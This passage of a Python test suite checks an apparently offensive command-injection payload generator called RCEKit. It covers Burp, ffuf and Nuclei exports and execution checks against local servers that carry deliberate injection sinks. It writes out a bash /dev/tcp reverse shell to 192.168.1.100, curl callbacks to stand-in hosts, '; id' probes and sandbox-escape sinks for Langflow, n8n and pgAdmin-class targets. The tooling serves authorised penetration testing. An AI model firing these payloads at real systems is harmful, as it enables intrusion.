            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_ffuf_export_clears_stale_request_artifacts(self):
        # A profile-backed run followed by a wordlist-only run on the same output
        # directory must not leave the old request.txt/run.sh behind, or an
        # operator could fire a stale runner at the previous target.
        abs_request = {"url": "https://target.example/api/v1/lookup", "method": "POST",
                       "headers": {"Content-Type": "application/json"},
                       "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            outdir = Path(tmp) / "run_ffuf"
            # First run: concrete host -> request.txt + run.sh created.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=abs_request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["json"], selected_encodings=["none"],
            )
            self.assertTrue((outdir / "request.txt").exists())
            self.assertTrue((outdir / "run.sh").exists())
            # Second run on the same dir with no profile -> stale runner is gone.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_export_is_profile_request_aware(self):
        request = {"url": "/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            # Burp request.txt reflects the profile's method/path/body.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            burp_req = (Path(tmp) / "run_burp" / "request.txt").read_text(encoding="utf-8")
            self.assertIn("POST /api/v1/lookup HTTP/1.1", burp_req)
            self.assertIn("Content-Type: application/json", burp_req)
            self.assertIn('{"host": "\xa7payload\xa7"}', burp_req)

            # Nuclei templates embed the same request with the payload marker.
            out2 = Path(tmp) / "run2.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out2), output_format="nuclei", request_template=request,
                selected_environments=["unix"], mode="detection",
                max_safety="stateful", include_blocking=True,
            )
            templates = "\n".join(t.read_text(encoding="utf-8") for t in (Path(tmp) / "run2_nuclei").glob("*.yaml"))
            self.assertIn("POST /api/v1/lookup HTTP/1.1", templates)
            self.assertIn('{"host": "{{payload}}"}', templates)

    def test_nuclei_export_writes_valid_templates(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="nuclei",
                selected_environments=["unix"], mode="detection",
                oob_domain="x.oast.pro", max_safety="stateful", include_blocking=True,
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_nuclei"
            templates = list(outdir.glob("*.yaml"))
            self.assertTrue(templates)
            joined = "\n".join(t.read_text(encoding="utf-8") for t in templates)
            # OOB templates must use the interactsh placeholder, not a real host.
            self.assertIn("{{interactsh-url}}", joined)
            self.assertIn("interactsh_protocol", joined)
            # Time templates normalise sleeps and never include hanging tails.
            time_files = list(outdir.glob("*-time.yaml"))
            if time_files:
                time_text = "\n".join(t.read_text(encoding="utf-8") for t in time_files)
                self.assertIn("duration>=6", time_text)
                self.assertNotIn("tail -f", time_text)


    def test_verify_confirms_execution_against_local_target(self):
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                pipe = sh_popen("echo " + host + " 2>&1")  # command injection sink
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ",
            )
            confirmed = [r for r in results if r["verdict"] == "executed"]
            self.assertTrue(confirmed, "the harness must confirm at least one RCE")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown()
            server.server_close()

    def test_timing_oracle_requires_a_reproducible_delay(self):
        # A blocking/timing payload is only "executed" when the delay clears the
        # noise margin AND reproduces on the re-fire; a one-off spike is jitter.
        rec = make_record(payload="; sleep 8", expected_channel="timing", blocking=True)
        confirmed, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=8.4, baseline=1.0, margin=2.0, elapsed_confirm=8.1)
        self.assertEqual(confirmed, "executed")
        # First request was slow but the delay did not reproduce -> not execution.
        jitter, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=8.4, baseline=1.0, margin=2.0, elapsed_confirm=1.2)
        self.assertEqual(jitter, "no-delay")
        # Below the margin at all -> not a delay.
        quick, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=1.5, baseline=1.0, margin=2.0, elapsed_confirm=None)
        self.assertEqual(quick, "no-delay")

    def test_reflection_oracle_rejects_signature_present_without_payload(self):
        # The command-output signature confirms execution only when it is absent
        # from the payload-free control response.
        rec = make_record(payload="; id", match=r"uid=\d+", expected_channel="response")
        confirmed, _ = self.gen._evaluate_verify(
            rec, 200, "uid=0(root) gid=0(root)", elapsed=0.1, baseline=0.1,
            control_body="welcome home")
        self.assertEqual(confirmed, "executed")
        # Same signature already in the baseline response -> not proof of execution.
        inconclusive, _ = self.gen._evaluate_verify(
            rec, 200, "uid=0(root) gid=0(root)", elapsed=0.1, baseline=0.1,
            control_body="debug: uid=0(root) always shown")
        self.assertEqual(inconclusive, "inconclusive")

    def test_verify_marks_always_reflected_signature_inconclusive(self):
        # End-to-end: a target that echoes the signature regardless of input must
        # not be reported as a confirmed RCE.
        import http.server
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                self.send_response(200)
                self.end_headers()
                # Signature present for every request, payload or not.
                self.wfile.write(b"uid=0(root) gid=0(root) groups=0(root)")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ",
            )
            id_results = [r for r in results if r["payload"] == "; id"]
            self.assertTrue(id_results)
            self.assertEqual(id_results[0]["verdict"], "inconclusive")
            self.assertFalse(any(r["verdict"] == "executed" for r in results),
                             "a signature echoed regardless of payload must not confirm")
        finally:
            server.shutdown()
            server.server_close()

    def test_encode_for_location(self):
        # Each injection point gets its own on-the-wire encoding.
        self.assertEqual(self.gen._encode_for_location("; id", "query_value"), "%3B%20id")
        self.assertEqual(self.gen._encode_for_location("; id", "url_path"), "%3B%20id")
        self.assertEqual(self.gen._encode_for_location("; id", "form_value"), "%3B+id")
        # A JSON string body is escaped only — never percent-encoded.
        self.assertEqual(self.gen._encode_for_location("; id", "json_string"), "; id")
        self.assertEqual(self.gen._encode_for_location('a"b\\c', "json_string"), 'a\\"b\\\\c')
        # Headers stay on one line.
        self.assertEqual(self.gen._encode_for_location("a\r\nb", "header"), "a  b")
        self.assertEqual(self.gen._encode_for_location("; id", "raw"), "; id")
        with self.assertRaises(ValueError):
            self.gen._encode_for_location("x", "bogus")

    def test_detect_body_location(self):
        # Body shape drives the default...
        self.assertEqual(self.gen._detect_body_location('{"host": "FUZZ"}', []), "json_string")
        self.assertEqual(self.gen._detect_body_location('host=FUZZ&x=1', []), "form_value")
        self.assertEqual(self.gen._detect_body_location('FUZZ', []), "raw")
        # ...and an explicit Content-Type wins over the shape.
        self.assertEqual(
            self.gen._detect_body_location('FUZZ', ["Content-Type: application/json"]), "json_string")
        self.assertEqual(
            self.gen._detect_body_location('FUZZ', ["Content-Type: application/x-www-form-urlencoded"]),
            "form_value")

    def test_build_verify_request_encodes_per_injection_point(self):
        # The URL marker is percent-encoded (server URL-decodes it back)...
        target, body, hdrs = self.gen._build_verify_request(
            "; id", url="http://t/?x=FUZZ", data=None, headers=None,
            url_location="query_value", body_location="raw")
        self.assertEqual(target, "http://t/?x=%3B%20id")
        # ...while a JSON body is escaped, NOT percent-encoded: the old blanket
        # URL-encoding handed the sink a literal "%3B%20id" and broke every JSON
        # injection. Regression guard for that bug.
        _, body, _ = self.gen._build_verify_request(
            "; id", url="http://t/api", data='{"host": "FUZZ"}', headers=None,
            url_location="query_value", body_location="json_string")
        self.assertEqual(body, b'{"host": "; id"}')
        self.assertNotIn(b"%3B", body)
        # Headers carry the payload verbatim on a single line.
        _, _, hdrs = self.gen._build_verify_request(
            "; id", url="http://t/", data=None, headers=["X-Fuzz: FUZZ"],
            url_location="query_value", body_location="raw")
        self.assertEqual(hdrs["X-Fuzz"], "; id")

    def test_verify_confirms_execution_in_json_body(self):
        # End-to-end regression: a JSON-body command-injection sink must be
        # confirmed. With the old blanket URL-encoding the sink received
        # "%3B%20id" and nothing ever executed.
        import http.server
        import json as _json
        import os
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                raw = self.rfile.read(length).decode(errors="replace")
                try:
                    host = _json.loads(raw).get("host", "")
                except Exception:
                    host = ""
                pipe = sh_popen("echo " + host + " 2>&1")  # command injection sink
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/api", method="POST",
                data='{"host": "FUZZ"}',
                headers=["Content-Type: application/json"],
            )
            confirmed = [r for r in results if r["verdict"] == "executed"]
            self.assertTrue(confirmed, "a JSON-body RCE must be confirmed")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown()
            server.server_close()

    def test_canary_oracle_rejects_reflected_token(self):
        # The same-token control disambiguates reflection from execution.
        rec = make_record(payload="echo DETECTION_ABC123", token="ABC123",
                          match=r"ABC123", expected_channel="response")
        # Token in the response AND in the inert same-token control -> the target
        # echoes input, so the match is not proof of execution.
        reflected, _ = self.gen._evaluate_verify(
            rec, 200, "you sent: echo DETECTION_ABC123", elapsed=0.1, baseline=0.1,
            control_body="you sent: rcekit-control-ABC123")
        self.assertEqual(reflected, "inconclusive")
        # Token in the response but absent from the inert control -> execution.
        executed, _ = self.gen._evaluate_verify(
            rec, 200, "DETECTION_ABC123", elapsed=0.1, baseline=0.1,
            control_body="(command not found)")
        self.assertEqual(executed, "executed")

    def _run_detection_echo_verify(self, handler_cls):
        import socketserver
        import threading

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), handler_cls)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = [
                r for r in self.gen.generate_payload_records(
                    mode="detection", selected_environments=["unix"],
                    selected_contexts=["raw"], selected_encodings=["none"])
                if r.payload.startswith("echo DETECTION_")
            ]
            self.assertTrue(records, "expected a canary detection payload")
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ")
            return [r for r in results if r["payload"].startswith("echo DETECTION_")]
        finally:
            server.shutdown()
            server.server_close()

    def test_verify_canary_inconclusive_against_reflecting_target(self):
        # A target that echoes input back returns the canary without executing
        # anything, so it must never be reported as confirmed execution.
        import http.server
        import urllib.parse as up

        class Reflect(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                self.send_response(200)
                self.end_headers()
                self.wfile.write(host.encode(errors="replace"))  # reflect, do NOT execute

        echoed = self._run_detection_echo_verify(Reflect)
        self.assertTrue(echoed)
        self.assertEqual(echoed[0]["verdict"], "inconclusive")
        self.assertFalse(any(r["verdict"] == "executed" for r in echoed),
                         "a reflected canary must not confirm execution")

    def test_verify_canary_confirmed_against_executing_target(self):
        # A target that actually runs the input yields the canary only for the
        # executing payload, not for the inert same-token control -> confirmed.
        import http.server
        import os
        import urllib.parse as up

        class Execute(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                pipe = sh_popen(host + " 2>/dev/null")  # runs the input directly
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        executed = self._run_detection_echo_verify(Execute)
        self.assertTrue(executed)
        self.assertEqual(executed[0]["verdict"], "executed")

    def test_expected_delay_ms_is_runtime_aware(self):
        cases = [
            ("sleep 5", "unix", 5000),
            ("sleep 2", "docker", 2000),
            ("sleep 1", "ruby", 1000),
            ("timeout /T 5", "windows", 5000),
            ("Start-Sleep -Seconds 3", "powershell", 3000),
            ("Start-Sleep -Milliseconds 500", "powershell", 500),
            ("import time; time.sleep(2)", "python", 2000),
            ("__import__('time').sleep(1)", "python", 1000),
            ("Thread.sleep(2000)", "java", 2000),
            ("System.Threading.Thread.Sleep(2000)", "dotnet", 2000),
            ("select(undef, undef, undef, 1)", "perl", 1000),
            ("time.Sleep(1 * time.Second)", "go", 1000),
            ("SELECT pg_sleep(1)", "sql", 1000),
            ("setTimeout(()=>console.log('x'), 1000)", "nodejs", 1000),
            ("echo DETECTION_ABC", "unix", None),  # not a sleep
        ]
        for payload, env, expected in cases:
            self.assertEqual(self.gen._expected_delay_ms(payload, env), expected,
                             f"{payload!r} @ {env}")

    def test_generated_blocking_record_carries_expected_delay(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            include_blocking=True))
        sleeps = [r for r in records if r.payload == "sleep 5"]
        self.assertTrue(sleeps, "the blocking 'sleep 5' detection payload should be present")
        self.assertTrue(sleeps[0].blocking)
        self.assertEqual(sleeps[0].expected_delay_ms, 5000)
        # A non-blocking payload leaves the field unset.
        echoes = [r for r in records if r.payload.startswith("echo DETECTION_")]
        self.assertTrue(echoes)
        self.assertIsNone(echoes[0].expected_delay_ms)

    def test_oob_pending_survives_a_timed_out_delivery(self):
        # An OOB payload is confirmed out-of-band, so a timed-out delivery
        # request (status=None) must stay oob-pending, not become a flat error.
        rec = make_record(payload="; curl http://x/", expected_channel="interactsh", token="TOK")
        verdict, _ = self.gen._evaluate_verify(
            rec, None, "timed out", elapsed=8.0, baseline=1.0, margin=2.0)
        self.assertEqual(verdict, "oob-pending")

    def test_timing_timeout_is_a_candidate_not_an_error(self):
        rec = make_record(payload="; sleep 8", expected_channel="timing", blocking=True)
        # Hung past the timeout for at least the margin -> the hang may be the
        # sleep itself, so surface it as a candidate rather than a flat error.
        verdict, _ = self.gen._evaluate_verify(
            rec, None, "timed out", elapsed=6.0, baseline=1.0, margin=2.0)
        self.assertEqual(verdict, "timing-candidate-on-timeout")
        # A short hang that never cleared the margin is just an error.
        verdict, _ = self.gen._evaluate_verify(
            rec, None, "boom", elapsed=1.2, baseline=1.0, margin=2.0)
        self.assertEqual(verdict, "error")

    def test_verify_confirms_subsecond_sleep_via_expected_delay(self):
        # A 1s sleep — impossible to confirm under the old flat 2s floor — is
        # confirmed once the threshold adapts to the payload's expected delay.
        import http.server
        import socketserver
        import threading
        import time as _time
        import urllib.parse as up

        class Sleeper(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                if "sleep" in host:
                    _time.sleep(1.0)  # the injected 1s sleep executes here
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Sleeper)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = [make_record(payload="; sleep 1", expected_channel="timing",
                                   blocking=True, expected_delay_ms=1000)]
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ")
            self.assertEqual(results[0]["verdict"], "executed")
        finally:
            server.shutdown()
            server.server_close()

    def test_build_verification_plan(self):
        recs = [
            make_record(payload="; id", category="basic_enum", safety="safe"),
            make_record(payload="; id", category="basic_enum", safety="safe"),  # duplicate
            make_record(payload="bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                        category="reverse_shells", safety="intrusive"),
            make_record(payload="; curl http://tok.oob.example/", category="oob",
                        safety="intrusive", expected_channel="interactsh",
                        token="tok", oob_host="tok.oob.example"),
        ]
        lines, to_send = rcekit.build_verification_plan(
            recs, "GET", "http://t/?x=FUZZ",
            attacker_ip="192.168.1.100", attacker_domain="attacker.com")
        self.assertEqual(len(to_send), 3, "duplicate payloads collapse")
        text = "\n".join(lines)
        self.assertIn("3 unique payloads", text)
        self.assertIn("HIGH-IMPACT", text)
        self.assertIn("reverse_shells", text)
        self.assertIn("192.168.1.100", text)          # reverse-shell callback host
        self.assertIn("oob.example", text)            # OOB callback domain
        # --max-payloads caps what will be sent.
        _, capped = rcekit.build_verification_plan(recs, "GET", "u", max_payloads=1)
        self.assertEqual(len(capped), 1)


    def test_interleave_round_robins_buckets(self):
        recs = ([make_record(payload=f"u{i}", environment="unix") for i in range(3)]
                + [make_record(payload=f"w{i}", environment="windows") for i in range(2)])
        out = list(RCEKit._interleave(recs, key=lambda r: r.environment))
        self.assertEqual(len(out), 5)
        # The first two span both buckets instead of exhausting 'unix' first.
        self.assertEqual(out[0].environment, "unix")
        self.assertEqual(out[1].environment, "windows")

    def test_shared_payload_keeps_per_environment_provenance(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix", "windows"],
            selected_contexts=["raw"], selected_encodings=["none"]))
        whoami_envs = {r.environment for r in records if r.payload == "whoami"}
        # A command shared across environments keeps a record for each, not just
        # whichever emitted it first.
        self.assertIn("unix", whoami_envs)
        self.assertIn("windows", whoami_envs)

    def test_max_payloads_samples_across_buckets(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "c.jsonl"
            self.gen.save_payloads_to_file(
                file_path=str(out), max_payloads=30, output_format="jsonl",
                selected_encodings=["none"])
            rows = [json.loads(line) for line in out.read_text(encoding="utf-8").splitlines() if line.strip()]
            self.assertLessEqual(len(rows), 30)
            self.assertGreater(len({r["category"] for r in rows}), 1,
                               "a capped run must span more than one category")
            self.assertGreater(len({r["environment"] for r in rows}), 1,
                               "a capped run must span more than one environment")

    def test_text_output_has_no_duplicate_lines(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "c.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="text",
                selected_categories=["basic_enum"],
                selected_environments=["unix", "windows"],
                selected_contexts=["raw"], selected_encodings=["none"])
            lines = [line for line in out.read_text(encoding="utf-8").splitlines() if line.strip()]
            self.assertTrue(lines)
            self.assertEqual(len(lines), len(set(lines)),
                             "the text wordlist must not repeat payload lines")


class VerifySafeByDefaultTestCase(unittest.TestCase):
    """The CLI must not fire high-impact payloads at a target by default."""

    def _serve(self):
        import http.server
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _ok(self):
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            do_GET = _ok
            do_POST = _ok

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        return server, port

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_reverse_shells_are_held_back_by_default(self):
        server, port = self._serve()
        try:
            url = f"http://127.0.0.1:{port}/?x=FUZZ"
            # Default: reverse shells are 'intrusive', so nothing is fired.
            safe = self._run("--acknowledge-consent", "--categories", "reverse_shells",
                             "--environments", "unix", "--verify-url", url)
            self.assertEqual(safe.returncode, 0, safe.stderr)
            self.assertIn("0 unique payloads to send", safe.stdout)
            self.assertIn("--verify-active-risk intrusive", safe.stdout)
            # Opt in: now they are included and the plan flags the high-impact set.
            active = self._run("--acknowledge-consent", "--categories", "reverse_shells",
                               "--environments", "unix", "--verify-active-risk", "intrusive",
                               "--max-payloads", "15", "--verify-url", url)
            self.assertEqual(active.returncode, 0, active.stderr)
            self.assertIn("HIGH-IMPACT", active.stdout)
            self.assertIn("reverse_shells", active.stdout)
            self.assertIn("192.168.1.100", active.stdout)  # reverse-shell callback host
            self.assertNotIn("0 unique payloads to send", active.stdout)
        finally:
            server.shutdown()
            server.server_close()


class DoctorTestCase(unittest.TestCase):
    """Corpus integrity check and hard-fail on a missing/empty corpus."""

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_check_integrity_ok_on_shipped_corpus(self):
        ok, report = RCEKit().check_integrity()
        self.assertTrue(ok)
        self.assertTrue(any("corpus loaded and parsed" in line for line in report))

    def test_check_integrity_fails_on_missing_corpus(self):
        gen = RCEKit(template_path=Path("/no/such/corpus.json"))
        ok, report = gen.check_integrity()
        self.assertFalse(ok)
        self.assertTrue(any("FAIL" in line for line in report))
        self.assertFalse(gen.corpus_ready("exploit")[0])
        self.assertFalse(gen.corpus_ready("detection")[0])

    def test_corpus_ready_is_mode_aware(self):
        with tempfile.TemporaryDirectory() as tmp:
            tf = Path(tmp) / "only_detection.json"
            tf.write_text(json.dumps(
                {"detection_payloads": {"unix": ["echo DETECTION_{canary}"]}}))
            gen = RCEKit(template_path=tf)
            self.assertTrue(gen.corpus_ready("detection")[0])
            self.assertFalse(gen.corpus_ready("exploit")[0])  # no exploit categories

    def test_doctor_cli_exit_codes(self):
        good = self._run("--doctor")
        self.assertEqual(good.returncode, 0)
        self.assertIn("[doctor] OK", good.stdout)
        bad = self._run("--doctor", "--template-file", "/no/such/corpus.json")
        self.assertEqual(bad.returncode, 1)
        self.assertIn("PROBLEMS FOUND", bad.stdout)

    def test_run_hard_fails_on_missing_corpus(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.txt"
            res = self._run("--detection-only", "--template-file", "/no/such/corpus.json",
                            "-o", str(out))
            self.assertEqual(res.returncode, 1)
            self.assertIn("Refusing to run", res.stdout)
            self.assertFalse(out.exists())


class InstalledShapeTestCase(unittest.TestCase):
    """How RCEKit behaves with no corpus directory beside it.

    That is what an installed wheel looks like — `py-modules = ["rcekit"]` ships
    the module and nothing else — and what a lone `rcekit.py` curled onto a jump
    box looks like. In both, the embedded corpus *is* the corpus: nothing is
    missing, so nothing should be reported as missing.

    The distinction that carries this is the corpus **directory**, not the file.
    A `templates/` directory that exists without its `payloads.json` is a
    checkout where something was deleted or never generated, and staying quiet
    about that would let someone believe they were running an edited corpus when
    they were not."""

    def _copy_module(self, directory):
        target = Path(directory) / "rcekit.py"
        target.write_bytes(SCRIPT.read_bytes())
        return target

    def _run(self, cwd, *args):
        return subprocess.run(
            [sys.executable, "rcekit.py", *args],
            cwd=str(cwd), capture_output=True, text=True, timeout=120,
        )

    def test_no_corpus_directory_is_silent_and_healthy(self):
        with tempfile.TemporaryDirectory() as tmp:
            self._copy_module(tmp)
            res = self._run(tmp, "--doctor")
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        self.assertIn("[doctor] OK", res.stdout)
        # The two things that made an installed run read as broken.
        self.assertNotIn("not found", res.stdout)
        self.assertNotIn("[i] Using the built-in payload corpus", res.stdout)

    def test_the_doctor_names_the_embedded_corpus_as_a_source_not_a_fault(self):
        with tempfile.TemporaryDirectory() as tmp:
            self._copy_module(tmp)
            res = self._run(tmp, "--doctor")
        self.assertIn("corpus: built-in (embedded in rcekit.py)", res.stdout)
        self.assertIn("[ok] corpus loaded and parsed", res.stdout)

    def test_a_corpus_directory_without_its_file_still_says_so(self):
        with tempfile.TemporaryDirectory() as tmp:
            self._copy_module(tmp)
            (Path(tmp) / "templates").mkdir()
            res = self._run(tmp, "--doctor")
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        self.assertIn("[i] Using the built-in payload corpus", res.stdout)

    def test_a_corrupt_corpus_beside_the_module_still_refuses_to_run(self):
        # The fallback is for an *absent* corpus only. Falling back over a
        # corrupt one would mask a truncated or tampered file, which is the case
        # the hard-fail was written for.
        with tempfile.TemporaryDirectory() as tmp:
            self._copy_module(tmp)
            templates = Path(tmp) / "templates"
            templates.mkdir()
            (templates / "payloads.json").write_text("{ not json", encoding="utf-8")
            doctor = self._run(tmp, "--doctor")
            run = self._run(tmp, "--detection-only", "-o", str(Path(tmp) / "out.txt"))
        self.assertEqual(doctor.returncode, 1, doctor.stdout)
        self.assertIn("[FAIL]", doctor.stdout)
        self.assertEqual(run.returncode, 1, run.stdout)

    def test_an_explicit_template_file_never_falls_back(self):
        # "I pointed at my corpus" has to keep meaning what it says, whatever
        # layout the module is running from.
        with tempfile.TemporaryDirectory() as tmp:
            self._copy_module(tmp)
            out = Path(tmp) / "out.txt"
            res = self._run(tmp, "--detection-only", "--template-file",
                            str(Path(tmp) / "nope.json"), "-o", str(out))
            self.assertEqual(res.returncode, 1, res.stdout)
            self.assertFalse(out.exists(), "a refused run must not leave output behind")

    def test_a_detection_run_works_with_no_corpus_directory(self):
        # The embedded corpus has to actually serve a run, not merely pass the
        # doctor: an installed wheel has nothing else to fall back to.
        with tempfile.TemporaryDirectory() as tmp:
            self._copy_module(tmp)
            out = Path(tmp) / "payloads.txt"
            res = self._run(tmp, "--detection-only", "-o", str(out), "--max-payloads", "5")
            self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
            self.assertTrue(out.exists())
            self.assertTrue(out.read_text(encoding="utf-8").strip())


class NewSinkCoverageTestCase(unittest.TestCase):
    """Sinks added from the real-world Vulhub evaluation. Each new payload must
    carry the right machine-readable oracle so verification can confirm it."""

    def setUp(self):
        self.gen = RCEKit()

    def test_exec_ast_python_sink_confirms_via_command_oracle(self):
        # Langflow-class sink: exec() of AST function-defs runs decorators and
        # default-arg expressions. Payloads are function definitions; the existing
        # command oracles must still attach.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["python"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        exec_ast = [r for r in records if r.sink == "exec_ast"]
        self.assertTrue(exec_ast, "exec_ast sink must emit payloads")
        self.assertTrue(all(("def " in r.payload or "@" in r.payload) for r in exec_ast))
        self.assertTrue(any(r.match == r"uid=\d+" for r in exec_ast))
        self.assertTrue(any(r.match and "root:" in r.match for r in exec_ast))

    def test_expression_template_nodejs_sink_present_with_oracle(self):
        # n8n-class sink: server-side {{ }} expression evaluation with a sandbox
        # escape reaching child_process.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["nodejs"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        expr = [r for r in records if r.sink == "expression_template"]
        self.assertTrue(expr, "expression_template sink must emit payloads")
        self.assertTrue(any("this.process" in r.payload for r in expr))
        self.assertTrue(any(r.match == r"uid=\d+" for r in expr))

    def test_psql_meta_command_sink_carries_cr_bypass_and_oracle(self):
        # pgAdmin-class sink: psql \! meta-command with a CR (\r) validator bypass.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["postgres"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        psql = [r for r in records if r.sink == "psql_meta_command"]
        self.assertTrue(psql, "psql_meta_command sink must emit payloads")
        self.assertTrue(any("\r" in r.payload and "\\!" in r.payload for r in psql),
                        "a CR-separated \\! bypass variant must be present")
        self.assertTrue(any(r.match == r"uid=\d+" for r in psql))

    def test_math_canary_is_a_unique_product_not_49(self):
        # The fixed 7*7=49 signature collides with any '49' on the page; the {math}
        # canary must expand to a random product with a matching unique oracle.
        seen_products = set()
        for _ in range(5):
            gen = RCEKit()
            records = list(gen.generate_payload_records(
                selected_categories=["code_execution"], selected_environments=["python"],
                selected_contexts=["raw"], selected_encodings=["none"],
            ))
            # The canary is a multi-digit product ({{ 1234*5678 }}); match it
            # precisely so it is never confused with the fixed {{7*7}} probe.
            math = [r for r in records
                    if re.fullmatch(r"\{\{\s*\d{3,}\*\d{3,}\s*\}\}", r.payload.strip())]
            self.assertTrue(math, "a {math} canary payload must be emitted")
            for r in math:
                m = re.search(r"(\d+)\*(\d+)", r.payload)
                product = int(m.group(1)) * int(m.group(2))
                self.assertRegex(str(product), r.match)
                self.assertNotEqual(product, 49)
                seen_products.add(product)
        self.assertGreater(len(seen_products), 1, "products must be randomized per run")


class EncodedOracleTestCase(unittest.TestCase):
    """O5: the confirmation oracle must see through common output wrappers so a
